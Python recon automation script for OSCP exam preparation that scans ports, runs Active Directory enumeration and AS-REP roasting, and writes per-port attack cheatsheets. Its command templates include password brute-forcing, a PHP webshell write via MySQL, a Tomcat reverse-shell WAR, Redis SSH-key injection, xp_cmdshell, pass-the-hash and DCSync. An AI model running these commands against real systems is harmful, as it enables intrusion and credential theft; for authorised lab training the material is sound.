#!/usr/bin/env python3
"""
oscp_recon.py — OSCP Recon Automation Suite
═══════════════════════════════════════════
Stages:
  1. RustScan       → fast TCP port discovery
  2. Nmap           → detailed TCP + UDP top-200
  3. AD Module      → auto-runs kerbrute/enum4linux-ng/ldapdomaindump when AD/SMB ports found
  4. AutoRecon      → optional full-service deep scan (background or blocking)
  5. Scaffold       → ~/oscp/machines/<IP>/{nmap,exploits,screenshots,flags,scripts,ad_enum,autorecon}/
  6. Cheatsheet     → per-port "try this first" notes.md with fenced code blocks
  7. Screenshot     → timestamped proof.txt capture to screenshots/
  8. Cred Tracker   → shared ~/oscp/machines/creds.md updated after every scan
  9. Report Builder → stitches all machine notes.md into one exam_report.md

Usage:
    sudo python3 oscp_recon.py <ip>                                     # standard scan
    sudo python3 oscp_recon.py <ip> --autorecon                         # + AutoRecon background
    sudo python3 oscp_recon.py <ip> --autorecon-only                    # AutoRecon only
    sudo python3 oscp_recon.py <ip> --no-udp                            # skip UDP
    sudo python3 oscp_recon.py <ip> --screenshot                        # capture proof screenshot
    sudo python3 oscp_recon.py <ip> --add-cred admin Pass123 SMB ""     # log a credential
    sudo python3 oscp_recon.py --subnet 192.168.49.0/24                 # scan whole subnet
    sudo python3 oscp_recon.py --subnet 192.168.49.0/24 --threads 5    # subnet with thread control
    sudo python3 oscp_recon.py --subnet 192.168.49.0/24 --ping-only    # host discovery only
    sudo python3 oscp_recon.py --report                                  # build exam report

Requires : rustscan, nmap
Optional : autorecon, kerbrute, enum4linux-ng, ldapdomaindump, scrot
"""

import argparse
import subprocess
import sys
import os
import re
import json
import shutil
import ipaddress
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

# ─────────────────────────────────────────────────────────────────
#  COLORS
# ─────────────────────────────────────────────────────────────────
CYAN   = "\033[96m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
RED    = "\033[91m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

def banner():
    print(f"""{CYAN}{BOLD}
 ██████╗ ███████╗ ██████╗██████╗     ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
██╔═══██╗██╔════╝██╔════╝██╔══██╗    ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
██║   ██║███████╗██║     ██████╔╝    ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
██║   ██║╚════██║██║     ██╔═══╝     ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
╚██████╔╝███████║╚██████╗██║         ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
 ╚═════╝ ╚══════╝ ╚═════╝╚═╝         ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
 ##Created by FREEWORLD
{RESET}{YELLOW}  OSCP Recon Suite  |  RustScan → Nmap → AD → Scaffold → Cheatsheet → Report{RESET}
""")

def info(msg):  print(f"{GREEN}[+]{RESET} {msg}")
def warn(msg):  print(f"{YELLOW}[~]{RESET} {msg}")
def err(msg):   print(f"{RED}[!]{RESET} {msg}")
def head(msg):  print(f"\n{CYAN}{BOLD}{msg}{RESET}")

def run(cmd, capture=True):
    print(f"{DIM}    $ {cmd}{RESET}")
    r = subprocess.run(cmd, shell=True, capture_output=capture, text=True)
    if r.returncode != 0 and r.stderr:
        warn(f"stderr: {r.stderr.strip()[:200]}")
    return r.stdout

def tool_exists(name):
    return shutil.which(name) is not None


# ─────────────────────────────────────────────────────────────────
#  PORT CHEATSHEET DATABASE
#  Format: port → { service, tips: [(desc, cmd_template), ...] }
#  Templates: use {ip} and {port} as placeholders
# ─────────────────────────────────────────────────────────────────
PORT_CHEATSHEET = {
    21: {"service": "FTP", "tips": [
        ("Anonymous login check",   "ftp {ip}  # user: anonymous  pass: anonymous"),
        ("Anonymous via curl",      "curl -v ftp://{ip}/ --user anonymous:anonymous"),
        ("Download all files",      "wget -r ftp://{ip}/ --user=anonymous --password=anonymous"),
        ("Nmap FTP scripts",        "nmap -sV --script=ftp-anon,ftp-bounce,ftp-proftpd-backdoor,ftp-vsftpd-backdoor -p 21 {ip}"),
        ("Brute force",             "hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://{ip}"),
    ]},
    22: {"service": "SSH", "tips": [
        ("Banner grab",             "nc -nv {ip} 22"),
        ("Try default creds",       "ssh root@{ip}; ssh admin@{ip}"),
        ("Enumerate auth methods",  "ssh -v {ip} 2>&1 | grep 'Auth'"),
        ("Brute force",             "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh://{ip} -t 4"),
        ("OpenSSH user enum CVE",   "python3 ssh_user_enum.py --userList users.txt --ip {ip}"),
        ("Key hunt (post-shell)",   "find / -name id_rsa 2>/dev/null; find / -name authorized_keys 2>/dev/null"),
    ]},
    23: {"service": "Telnet", "tips": [
        ("Connect",                 "telnet {ip} 23"),
        ("Brute force",             "hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://{ip}"),
        ("Nmap scripts",            "nmap -sV --script=telnet-ntlm-info,telnet-encryption -p 23 {ip}"),
    ]},
    25: {"service": "SMTP", "tips": [
        ("Banner grab",             "nc -nv {ip} 25"),
        ("VRFY user enum",          "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {ip}"),
        ("RCPT TO enum",            "smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -t {ip}"),
        ("Send test email",         "swaks --to user@domain --from attacker@evil.com --server {ip}"),
        ("Open relay check",        "nmap -sV --script smtp-open-relay -p 25 {ip}"),
        ("Send .Library-ms lure",   "swaks --to user@domain.local --from attacker@domain.local --server {ip} --attach config.Library-ms"),
    ]},
    53: {"service": "DNS", "tips": [
        ("Zone transfer",           "dig axfr @{ip} domain.local"),
        ("Reverse lookup",          "dig -x {ip} @{ip}"),
        ("All records",             "dig any domain.local @{ip}"),
        ("dnsrecon subdomain brute","dnsrecon -d domain.local -t brt -D /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt"),
        ("dnsenum",                 "dnsenum --dnsserver {ip} domain.local"),
    ]},
    80: {"service": "HTTP", "tips": [
        ("Gobuster dir scan",       "gobuster dir -u http://{ip} -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,txt,html,bak -t 40"),
        ("Feroxbuster",             "feroxbuster -u http://{ip} -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,txt,html"),
        ("Nikto",                   "nikto -h http://{ip}"),
        ("Tech fingerprint",        "whatweb http://{ip}"),
        ("Check robots/sitemap",    "curl http://{ip}/robots.txt; curl http://{ip}/sitemap.xml"),
        ("VHost fuzzing",           "wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.{ip}' --hc 400,404 http://{ip}"),
        ("SQLmap",                  "sqlmap -u 'http://{ip}/page?id=1' --dbs --batch"),
        ("LFI wordlist",            "wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://{ip}/page?file=FUZZ"),
    ]},
    88: {"service": "Kerberos", "tips": [
        ("User enum (kerbrute)",    "kerbrute userenum -d domain.local --dc {ip} /usr/share/seclists/Usernames/Names/names.txt -o kerbrute_users.txt"),
        ("AS-REP Roast (no creds)", "impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip {ip} -request -outputfile asrep_hashes.txt"),
        ("AS-REP Roast (creds)",    "impacket-GetNPUsers domain.local/user:password -dc-ip {ip} -request"),
        ("Kerberoast (creds)",      "impacket-GetUserSPNs domain.local/user:password -dc-ip {ip} -request -outputfile kerb_hashes.txt"),
        ("Crack AS-REP hashes",     "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt"),
        ("Crack Kerberoast hashes", "hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt"),
        ("Password spray",          "kerbrute passwordspray -d domain.local --dc {ip} users.txt 'Password123!'"),
    ]},
    110: {"service": "POP3", "tips": [
        ("Banner grab",             "nc -nv {ip} 110"),
        ("Manual connect",          "telnet {ip} 110  # USER admin  PASS password  LIST  RETR 1"),
        ("Brute force",             "hydra -l admin -P /usr/share/wordlists/rockyou.txt pop3://{ip}"),
    ]},
    111: {"service": "RPCBind/NFS", "tips": [
        ("List RPC services",       "rpcinfo -p {ip}"),
        ("Show NFS shares",         "showmount -e {ip}"),
        ("Mount NFS share",         "mkdir /mnt/nfs && mount -t nfs {ip}:/share /mnt/nfs -o nolock"),
        ("Nmap NFS scripts",        "nmap -sV --script=nfs-ls,nfs-showmount,nfs-statfs -p 111 {ip}"),
        ("no_root_squash abuse",    "# cp /bin/bash /mnt/nfs/bash; chmod +s /mnt/nfs/bash\n# On target: /tmp/bash -p"),
    ]},
    135: {"service": "MSRPC", "tips": [
        ("rpcclient null session",  "rpcclient -U '' -N {ip}"),
        ("Enum domain users",       "rpcclient -U '' -N {ip} -c 'enumdomusers'"),
        ("Enum shares",             "rpcclient -U '' -N {ip} -c 'netshareenumall'"),
        ("Nmap scripts",            "nmap -sV --script=msrpc-enum -p 135 {ip}"),
    ]},
    139: {"service": "NetBIOS/SMB", "tips": [
        ("List shares (null)",      "smbclient -L //{ip} -N"),
        ("Enum4linux",              "enum4linux -a {ip}"),
        ("Nmap SMB scripts",        "nmap --script=smb-enum-shares,smb-enum-users,smb-vuln-ms17-010 -p 139,445 {ip}"),
    ]},
    143: {"service": "IMAP", "tips": [
        ("Banner grab",             "nc -nv {ip} 143"),
        ("Brute force",             "hydra -l admin -P /usr/share/wordlists/rockyou.txt imap://{ip}"),
        ("IMAPS connect",           "openssl s_client -connect {ip}:993"),
    ]},
    161: {"service": "SNMP (UDP)", "tips": [
        ("Community brute",         "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt {ip}"),
        ("SNMPwalk public",         "snmpwalk -c public -v2c {ip}"),
        ("snmp-check",              "snmp-check {ip} -c public"),
        ("Enum Windows users",      "snmpwalk -c public -v1 {ip} 1.3.6.1.4.1.77.1.2.25"),
        ("Nmap UDP SNMP",           "nmap -sU --script=snmp-info,snmp-interfaces,snmp-processes,snmp-win32-users -p 161 {ip}"),
    ]},
    389: {"service": "LDAP", "tips": [
        ("Anonymous query",         "ldapsearch -x -h {ip} -b 'dc=domain,dc=local'"),
        ("Get naming contexts",     "ldapsearch -x -h {ip} -s base namingcontexts"),
        ("Dump all (anon)",         "ldapsearch -x -h {ip} -b 'dc=domain,dc=local' '(objectClass=*)' | tee ldap_dump.txt"),
        ("ldapdomaindump",          "ldapdomaindump {ip} -u 'domain\\user' -p 'password' -o ldap_output/"),
        ("Check descriptions",      "ldapsearch -x -h {ip} -b 'dc=domain,dc=local' '(objectClass=user)' description"),
    ]},
    443: {"service": "HTTPS", "tips": [
        ("SSL cert info",           "openssl s_client -connect {ip}:443 | openssl x509 -noout -text"),
        ("Gobuster HTTPS",          "gobuster dir -u https://{ip} -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,txt,html -k -t 40"),
        ("sslscan",                 "sslscan {ip}:443"),
        ("Heartbleed check",        "nmap -sV --script=ssl-heartbleed -p 443 {ip}"),
        ("Nikto HTTPS",             "nikto -h https://{ip} -ssl"),
    ]},
    445: {"service": "SMB", "tips": [
        ("List shares (null)",      "smbclient -L //{ip} -N"),
        ("CrackMapExec null enum",  "crackmapexec smb {ip} --shares -u '' -p ''"),
        ("Enum4linux full",         "enum4linux -a {ip}"),
        ("EternalBlue check",       "nmap -sV --script smb-vuln-ms17-010 -p 445 {ip}"),
        ("All SMB vuln scripts",    "nmap --script='smb-vuln*' -p 445 {ip}"),
        ("Connect to share",        "smbclient //{ip}/C$ -N"),
        ("Mount share",             "mount -t cifs //{ip}/ShareName /mnt/smb -o user=,password="),
        ("Pass-the-hash (CME)",     "crackmapexec smb {ip} -u Administrator -H '<NTLM_HASH>'"),
        ("impacket psexec",         "impacket-psexec domain/user:password@{ip}"),
        ("impacket wmiexec",        "impacket-wmiexec domain/user:password@{ip}"),
    ]},
    1433: {"service": "MSSQL", "tips": [
        ("Default creds",           "impacket-mssqlclient sa:password@{ip}"),
        ("CrackMapExec",            "crackmapexec mssql {ip} -u sa -p password"),
        ("Enable xp_cmdshell",      "EXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';"),
        ("Nmap scripts",            "nmap -sV --script=ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell -p 1433 {ip}"),
        ("Brute force",             "hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://{ip}"),
    ]},
    2049: {"service": "NFS", "tips": [
        ("Show exports",            "showmount -e {ip}"),
        ("Mount share",             "mkdir /mnt/nfs; mount -t nfs {ip}:/ /mnt/nfs -o nolock"),
        ("no_root_squash abuse",    "# Upload SUID shell to mounted share, execute on target for root"),
        ("Nmap scripts",            "nmap -sV --script=nfs-ls,nfs-showmount,nfs-statfs -p 2049 {ip}"),
    ]},
    3306: {"service": "MySQL", "tips": [
        ("Connect (root no pass)",  "mysql -u root -h {ip}"),
        ("Connect with creds",      "mysql -u root -p -h {ip}"),
        ("Nmap scripts",            "nmap -sV --script=mysql-empty-password,mysql-databases,mysql-users -p 3306 {ip}"),
        ("Read /etc/passwd",        "SELECT LOAD_FILE('/etc/passwd');"),
        ("Write webshell",          "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';"),
        ("Brute force",             "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://{ip}"),
    ]},
    3389: {"service": "RDP", "tips": [
        ("Connect",                 "xfreerdp /u:Administrator /p:password /v:{ip} /cert-ignore"),
        ("Pass-the-hash",           "xfreerdp /u:Administrator /pth:<NTLM_HASH> /v:{ip}"),
        ("BlueKeep check",          "nmap -sV --script=rdp-vuln-ms12-020 -p 3389 {ip}"),
        ("Brute force",             "hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://{ip} -t 4"),
        ("Nmap RDP scripts",        "nmap -sV --script=rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 {ip}"),
    ]},
    5432: {"service": "PostgreSQL", "tips": [
        ("Connect",                 "psql -h {ip} -U postgres"),
        ("Command exec (superuser)","DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;"),
        ("Brute force",             "hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://{ip}"),
    ]},
    5900: {"service": "VNC", "tips": [
        ("Connect",                 "vncviewer {ip}:5900"),
        ("Brute force",             "hydra -P /usr/share/wordlists/rockyou.txt vnc://{ip}"),
        ("Nmap scripts",            "nmap -sV --script=vnc-info,vnc-brute,realvnc-auth-bypass -p 5900 {ip}"),
    ]},
    5985: {"service": "WinRM (HTTP)", "tips": [
        ("evil-winrm connect",      "evil-winrm -i {ip} -u Administrator -p 'password'"),
        ("evil-winrm PTH",          "evil-winrm -i {ip} -u Administrator -H '<NTLM_HASH>'"),
        ("CrackMapExec check",      "crackmapexec winrm {ip} -u administrator -p password"),
    ]},
    5986: {"service": "WinRM (HTTPS)", "tips": [
        ("evil-winrm SSL",          "evil-winrm -i {ip} -u Administrator -p 'password' -S"),
        ("evil-winrm PTH SSL",      "evil-winrm -i {ip} -u Administrator -H '<NTLM_HASH>' -S"),
    ]},
    6379: {"service": "Redis", "tips": [
        ("Connect (no auth)",       "redis-cli -h {ip}"),
        ("Info dump",               "redis-cli -h {ip} info"),
        ("List keys",               "redis-cli -h {ip} keys '*'"),
        ("Write SSH key (as root)", "redis-cli -h {ip} config set dir /root/.ssh/\nredis-cli -h {ip} config set dbfilename authorized_keys\nredis-cli -h {ip} set crackit '\\n\\n<YOUR_PUBKEY>\\n\\n'\nredis-cli -h {ip} save"),
    ]},
    8080: {"service": "HTTP Alt / Tomcat / Jenkins", "tips": [
        ("Gobuster",                "gobuster dir -u http://{ip}:8080 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,txt,html,jsp"),
        ("Tomcat default creds",    "# admin/admin  tomcat/tomcat  admin/s3cret  manager/manager"),
        ("Tomcat WAR deploy shell", "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker> LPORT=4444 -f war -o shell.war\n# Upload via http://{ip}:8080/manager/html"),
        ("Jenkins script RCE",      "# Navigate to http://{ip}:8080/script\nprintln 'id'.execute().text"),
        ("Nikto",                   "nikto -h http://{ip}:8080"),
    ]},
    8443: {"service": "HTTPS Alt", "tips": [
        ("Gobuster HTTPS",          "gobuster dir -u https://{ip}:8443 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -k"),
        ("SSL cert",                "openssl s_client -connect {ip}:8443"),
        ("Nikto",                   "nikto -h https://{ip}:8443 -ssl"),
    ]},
    9200: {"service": "Elasticsearch", "tips": [
        ("Version check",           "curl http://{ip}:9200/"),
        ("List indices",            "curl http://{ip}:9200/_cat/indices?v"),
        ("Dump index",              "curl http://{ip}:9200/<index_name>/_search?pretty&size=100"),
    ]},
    27017: {"service": "MongoDB", "tips": [
        ("Connect (no auth)",       "mongo --host {ip}"),
        ("List databases",          "# In mongo shell: show dbs"),
        ("Nmap scripts",            "nmap -sV --script=mongodb-info,mongodb-databases -p 27017 {ip}"),
    ]},
}

GENERIC_TIPS = [
    ("Banner grab (nc)",    "nc -nv {ip} {port}"),
    ("Banner grab (curl)",  "curl -v http://{ip}:{port}"),
    ("Nmap detail scan",    "nmap -sV -sC -p {port} {ip}"),
    ("Searchsploit",        "searchsploit <service_name_and_version>"),
]

# Ports that indicate Active Directory presence
AD_PORTS  = {88, 389, 636, 3268, 3269}
SMB_PORTS = {139, 445}


# ─────────────────────────────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────────────────────────────
def parse_ports(text):
    ports = set()
    for m in re.finditer(r'(\d+)/(?:tcp|udp)', text):
        ports.add(int(m.group(1)))
    for m in re.finditer(r'Open\s+[\d.]+:(\d+)', text):
        ports.add(int(m.group(1)))
    return sorted(ports)


# ─────────────────────────────────────────────────────────────────
#  STAGE 1 — RUSTSCAN
# ─────────────────────────────────────────────────────────────────
def install_rustscan():
    """Download and install RustScan 2.4.1 (x86_64 Linux) from bee-san/RustScan."""
    import tempfile
    head("Installing RustScan 2.4.1...")
    url = "https://github.com/bee-san/RustScan/releases/download/2.4.1/x86_64-linux-rustscan.tar.gz.zip"
    with tempfile.TemporaryDirectory() as tmp:
        cmds = [
            f"wget -q {url} -O {tmp}/rustscan.zip",
            f"unzip -q {tmp}/rustscan.zip -d {tmp}",
            f"tar -xzf {tmp}/x86_64-linux-rustscan.tar.gz -C {tmp}",
            f"chmod +x {tmp}/rustscan",
            f"mv {tmp}/rustscan /usr/local/bin/rustscan",
        ]
        for cmd in cmds:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode != 0:
                err(f"Install step failed: {cmd}")
                err(result.stderr.strip())
                return False
    info("RustScan installed successfully.")
    return True


def run_rustscan(ip):
    head("[STAGE 1] RustScan — Fast TCP Discovery")
    if not tool_exists("rustscan"):
        warn("rustscan not found — attempting auto-install...")
        if not install_rustscan() or not tool_exists("rustscan"):
            warn("Install failed — falling back to nmap -p- (slower)")
            out   = run(f"nmap -T4 --open -p- {ip}")
            ports = parse_ports(out)
            info(f"TCP open ports: {ports}") if ports else err("No TCP ports discovered.")
            return ports

    out   = run(f"rustscan -a {ip} --ulimit 5000 -- -Pn 2>/dev/null")
    ports = parse_ports(out)
    if not ports:
        warn("RustScan returned nothing — falling back to nmap -p-")
        out   = run(f"nmap -T4 --open -p- {ip}")
        ports = parse_ports(out)
    info(f"TCP open ports: {ports}") if ports else err("No TCP ports discovered.")
    return ports

# ─────────────────────────────────────────────────────────────────
#  STAGE 2 — NMAP
# ─────────────────────────────────────────────────────────────────
def run_nmap_tcp(ip, ports, nmap_dir):
    head("[STAGE 2a] Nmap — Detailed TCP Scan")
    base = str(nmap_dir / "tcp_detail")
    cmd  = (f"nmap -sC -sV -O -Pn --open -p {','.join(str(p) for p in ports)} {ip} "
            f"-oN {base}.nmap -oX {base}.xml -oG {base}.gnmap")
    out  = run(cmd)
    info(f"TCP nmap saved → {base}.*")
    return out

def run_nmap_udp(ip, nmap_dir):
    head("[STAGE 2b] Nmap — UDP Top 200")
    base  = str(nmap_dir / "udp_top200")
    out   = run(f"nmap -sU --top-ports 200 -Pn --open {ip} "
                f"-oN {base}.nmap -oX {base}.xml -oG {base}.gnmap")
    ports = parse_ports(out)
    info(f"UDP open ports: {ports}") if ports else info("No UDP ports in top 200.")
    info(f"UDP nmap saved → {base}.*")
    return ports


# ─────────────────────────────────────────────────────────────────
#  STAGE 3 — AD MODULE
# ─────────────────────────────────────────────────────────────────
def run_ad_module(ip, tcp_ports, machine_dir):
    head("[STAGE 3] AD Module — Active Directory Enumeration")
    ad_dir   = machine_dir / "ad_enum"
    ad_dir.mkdir(parents=True, exist_ok=True)
    port_set = set(tcp_ports)

    info(f"AD/SMB ports detected: {sorted(port_set & (AD_PORTS | SMB_PORTS))}")
    domain = input(f"\n{YELLOW}[AD]{RESET} Enter domain name (e.g. corp.local) or Enter to skip: ").strip()
    if not domain:
        warn("No domain provided — skipping AD module.")
        return

    dc_ip = ip
    info(f"Domain: {domain}  |  DC: {dc_ip}")

    # ── kerbrute user enumeration
    if port_set & AD_PORTS:
        if tool_exists("kerbrute"):
            wl      = "/usr/share/seclists/Usernames/Names/names.txt"
            outfile = str(ad_dir / "kerbrute_users.txt")
            info("Running kerbrute userenum...")
            run(f"kerbrute userenum -d {domain} --dc {dc_ip} {wl} -o {outfile}")
            info(f"kerbrute → {outfile}")
        else:
            warn("kerbrute not found. Get it: https://github.com/ropnop/kerbrute/releases")

    # ── enum4linux-ng (SMB + RPC + LDAP)
    if port_set & SMB_PORTS:
        if tool_exists("enum4linux-ng"):
            outfile = str(ad_dir / "enum4linux_ng")
            info("Running enum4linux-ng...")
            run(f"enum4linux-ng -A {ip} -oJ {outfile}")
            info(f"enum4linux-ng → {outfile}.json")
        elif tool_exists("enum4linux"):
            outfile = str(ad_dir / "enum4linux.txt")
            info("Running enum4linux (fallback)...")
            run(f"enum4linux -a {ip} | tee {outfile}")
        else:
            warn("Neither enum4linux-ng nor enum4linux found.")

    # ── ldapdomaindump (needs creds)
    if port_set & (AD_PORTS | {389}):
        if tool_exists("ldapdomaindump"):
            creds = input(f"\n{YELLOW}[AD]{RESET} LDAP creds for ldapdomaindump? (user:pass or Enter to skip): ").strip()
            if creds and ":" in creds:
                user, pwd = creds.split(":", 1)
                out_dir   = str(ad_dir / "ldapdomaindump")
                info("Running ldapdomaindump...")
                run(f"ldapdomaindump {ip} -u '{domain}\\{user}' -p '{pwd}' -o {out_dir}/")
                info(f"ldapdomaindump → {out_dir}/")
            else:
                warn("Skipping ldapdomaindump — no creds provided.")
        else:
            warn("ldapdomaindump not found. Install: pip3 install ldapdomaindump")

    # ── AS-REP Roast against discovered users
    kerbrute_out = ad_dir / "kerbrute_users.txt"
    if (port_set & AD_PORTS) and kerbrute_out.exists():
        info("Running AS-REP Roast against kerbrute users...")
        users_clean = ad_dir / "users_clean.txt"
        run(f"grep 'VALID USERNAME' {kerbrute_out} | awk '{{print $NF}}' | cut -d@ -f1 > {users_clean}")
        asrep_out = str(ad_dir / "asrep_hashes.txt")
        run(f"impacket-GetNPUsers {domain}/ -usersfile {users_clean} -dc-ip {dc_ip} "
            f"-request -outputfile {asrep_out} -no-pass")
        asrep_path = Path(asrep_out)
        if asrep_path.exists() and asrep_path.stat().st_size > 0:
            info(f"AS-REP hashes captured → {asrep_out}")
            info("Crack: hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt")
        else:
            info("No AS-REP hashes captured (all accounts require pre-auth).")

    # ── Write AD attack notes
    dc_base = ',dc='.join(domain.split('.'))
    ad_notes = ad_dir / "ad_attacks.md"
    ad_notes.write_text("\n".join([
        f"# AD Attack Notes — {ip} ({domain})\n",
        "## Quick Wins Checklist\n",
        "- [ ] Kerberoasting\n- [ ] AS-REP Roasting\n- [ ] Password spraying",
        "- [ ] ACL abuse (BloodHound)\n- [ ] DCSync\n- [ ] Pass-the-Hash",
        "- [ ] Pass-the-Ticket\n- [ ] Silver Ticket\n- [ ] Golden Ticket\n",
        "## Key Commands\n",
        "```bash",
        f"# Kerberoasting",
        f"impacket-GetUserSPNs {domain}/user:password -dc-ip {dc_ip} -request -outputfile kerb_hashes.txt",
        f"hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt\n",
        f"# BloodHound collection (from Kali)",
        f"bloodhound-python -d {domain} -u user -p password -ns {dc_ip} -c all",
        f"# BloodHound collection (from Windows target)",
        f".\\SharpHound.exe -c All\n",
        f"# DCSync (requires DA or replication rights)",
        f"impacket-secretsdump {domain}/user:password@{dc_ip}",
        f"impacket-secretsdump -hashes :<NTLM_HASH> {domain}/Administrator@{dc_ip}\n",
        f"# Pass-the-Hash",
        f"impacket-psexec {domain}/Administrator@{dc_ip} -hashes :<NTLM_HASH>",
        f"crackmapexec smb {dc_ip} -u Administrator -H '<NTLM_HASH>' --shares\n",
        f"# Password spray (watch lockout policy!)",
        f"kerbrute passwordspray -d {domain} --dc {dc_ip} users.txt 'Password123!'\n",
        f"# LDAP anonymous dump",
        f"ldapsearch -x -h {dc_ip} -b 'dc={dc_base}' '(objectClass=*)' | tee ldap_all.txt",
        "```\n",
        "## BloodHound Queries to Run First\n",
        "- Shortest path to Domain Admins\n",
        "- Find all Kerberoastable users\n",
        "- Find AS-REP Roastable users\n",
        "- Find principals with DCSync rights\n",
        "- Find computers where Domain Users can RDP\n",
        "- Find computers with unconstrained delegation\n",
        "- Find objects with GenericAll / GenericWrite / WriteDACL\n",
    ]))
    info(f"AD attack notes → {ad_notes}")


# ─────────────────────────────────────────────────────────────────
#  STAGE 4 — AUTORECON (optional)
# ─────────────────────────────────────────────────────────────────
def run_autorecon(ip, machine_dir):
    head("[STAGE 4] AutoRecon — Full Service Enumeration (Background)")
    if not tool_exists("autorecon"):
        err("autorecon not found.")
        warn("Install: pip3 install git+https://github.com/Tib3rius/AutoRecon.git")
        return None
    out_dir      = machine_dir / "autorecon"
    out_dir.mkdir(parents=True, exist_ok=True)
    log_path     = out_dir / "autorecon.log"
    cmd          = f"autorecon {ip} --output {out_dir} --single-target"
    log_fh       = open(log_path, "w")
    proc         = subprocess.Popen(cmd, shell=True, stdout=log_fh, stderr=subprocess.STDOUT)
    info(f"AutoRecon launched (PID {proc.pid})")
    info(f"Output → {out_dir}")
    warn(f"Monitor: tail -f {log_path}")
    return proc


# ─────────────────────────────────────────────────────────────────
#  STAGE 5 — FOLDER SCAFFOLD
# ─────────────────────────────────────────────────────────────────
def scaffold(ip, root):
    head("[STAGE 5] Scaffolding Directory Structure")
    base = Path(root).expanduser() / ip
    for d in ["nmap", "exploits", "screenshots", "flags", "scripts", "ad_enum", "autorecon"]:
        (base / d).mkdir(parents=True, exist_ok=True)
        info(f"  {base / d}")
    info(f"Scaffold complete: {base}")
    return base


# ─────────────────────────────────────────────────────────────────
#  STAGE 6 — CHEATSHEET GENERATOR
# ─────────────────────────────────────────────────────────────────
def build_cheatsheet(ip, tcp_ports, udp_ports, machine_dir):
    head("[STAGE 6] Generating notes.md Cheatsheet")
    all_ports  = sorted(set(tcp_ports) | set(udp_ports))
    port_set   = set(tcp_ports)
    has_ad     = bool(port_set & (AD_PORTS | SMB_PORTS))
    notes_path = machine_dir / "notes.md"

    lines = [
        f"# OSCP Notes — {ip}\n",
        f"**Scan date:** {datetime.now().strftime('%Y-%m-%d %H:%M')}",
        f"**TCP open:** {', '.join(str(p) for p in tcp_ports) or 'none'}",
        f"**UDP open:** {', '.join(str(p) for p in udp_ports) or 'none'}",
        f"**AD target:** {'YES — see ad_enum/ad_attacks.md' if has_ad else 'No'}\n",
        "---\n",
        "## Quick Recon Commands\n",
        "```bash",
        f"nmap -sC -sV -O -Pn -p- {ip} -oN nmap/full_tcp.nmap",
        f"nmap -sU --top-ports 200 {ip} -oN nmap/udp.nmap",
        f"nmap --script vuln -Pn -p {','.join(str(p) for p in tcp_ports) or '1-1000'} {ip} -oN nmap/vuln.nmap",
        "```\n",
        "---\n",
        "## Per-Port Attack Cheatsheet\n",
    ]

    for port in all_ports:
        proto = "UDP" if port in udp_ports and port not in tcp_ports else "TCP"
        if port in PORT_CHEATSHEET:
            svc  = PORT_CHEATSHEET[port]["service"]
            tips = PORT_CHEATSHEET[port]["tips"]
        else:
            svc  = "Unknown"
            tips = GENERIC_TIPS

        lines.append(f"### Port {port}/{proto} — {svc}\n")
        for desc, cmd in tips:
            filled = cmd.replace("{ip}", ip).replace("{port}", str(port))
            lines += [f"**{desc}**", "```bash", filled, "```\n"]

    lines += [
        "---\n",
        "## Foothold Path\n",
        "_Document your initial access vector here._\n",
        "## Privilege Escalation Path\n",
        "_Document your privesc path here._\n",
        "## Lateral Movement\n",
        "_Document any pivoting or lateral movement here._\n",
        "## Flags\n",
        "| Flag | Path | Value |",
        "|---|---|---|",
        "| local.txt | C:\\\\Users\\\\user\\\\Desktop\\\\local.txt | |",
        "| proof.txt | C:\\\\Users\\\\Administrator\\\\Desktop\\\\proof.txt | |\n",
        "## Credentials Found\n",
        "| Username | Password / Hash | Service | Notes |",
        "|---|---|---|---|",
        "|  |  |  |  |\n",
        "## Screenshots\n",
        "_(proof screenshots saved to screenshots/)_\n",
    ]

    notes_path.write_text("\n".join(lines))
